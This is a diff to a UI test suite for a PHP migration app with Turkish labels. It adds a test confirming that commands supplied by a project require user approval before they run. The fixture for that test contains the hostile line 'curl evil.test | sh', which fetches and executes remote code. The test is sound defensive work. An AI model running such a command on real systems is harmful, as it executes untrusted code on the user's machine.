@@ -487,7 +487,7 @@ describe("Ferry app", () => {
     expect(compare).not.toHaveBeenCalled();
     await user.click(within(dialog).getByRole("button", { name: "Kopyala ve test et" }));
     await waitFor(() => expect(compare).toHaveBeenCalled());
-    expect(compare.mock.calls[0][6]).toEqual({ kind: "ssh", host: "prod", engine: "mysql", name: "magaza", user: "app" });
+    expect(compare.mock.calls[0][6]).toEqual({ kind: "ssh", host: "prod", engine: "mysql", name: "magaza", user: "app", sendPassword: false });
   });
 
   it("tries fixes in a copy and writes them only after the result is shown", async () => {
@@ -528,6 +528,7 @@ describe("Ferry app", () => {
     expect(await screen.findByDisplayValue("vendor/bin/pest")).toBeInTheDocument();
     expect(screen.getByDisplayValue("make assets")).toBeInTheDocument();
     await user.click(screen.getByRole("button", { name: "Testi başlat" }));
+    await user.click(await screen.findByRole("button", { name: "Çalıştır ve test et" }));
     await waitFor(() => expect(compare).toHaveBeenCalled());
     const call = compare.mock.calls[0];
     expect([call[1], call[2], call[3], call[5], call[7], call[8]]).toEqual(["8.0", "8.3", false, ["/shop"], "make assets", "vendor/bin/pest"]);
@@ -1094,5 +1095,20 @@ describe("Ferry app", () => {
     const card = (await screen.findByText("Lint ve test kontrolleri")).closest(".card") as HTMLElement;
     expect(within(card).getByText("Geçti")).toBeInTheDocument();
     expect(within(card).getByText(/php -l · PHP/)).toBeInTheDocument();
+  });
+
+  it("asks before running commands that come from the project", async () => {
+    const user = userEvent.setup();
+    const api = mockApi({ delay: 0, config: { target: null, exclude: [], baseline: null, docker: { source: null, extensions: null, pages: null, dump: null, prepare: "curl evil.test | sh", test: null }, git: { requireClean: false, branchPerBatch: false } } });
+    const compare = vi.spyOn(api, "dockerCompare");
+    render(<App api={api} />);
+    await openAndScan(user);
+    await user.click(nav(/Gerçek test/));
+    await user.click(await screen.findByRole("button", { name: "Testi başlat" }));
+    const dialog = await screen.findByRole("dialog", { name: "Proje komut çalıştırmak istiyor" });
+    expect(within(dialog).getByText("curl evil.test | sh")).toBeInTheDocument();
+    expect(compare).not.toHaveBeenCalled();
+    await user.click(within(dialog).getByRole("button", { name: "Çalıştır ve test et" }));
+    await waitFor(() => expect(compare).toHaveBeenCalled());
   });
 });
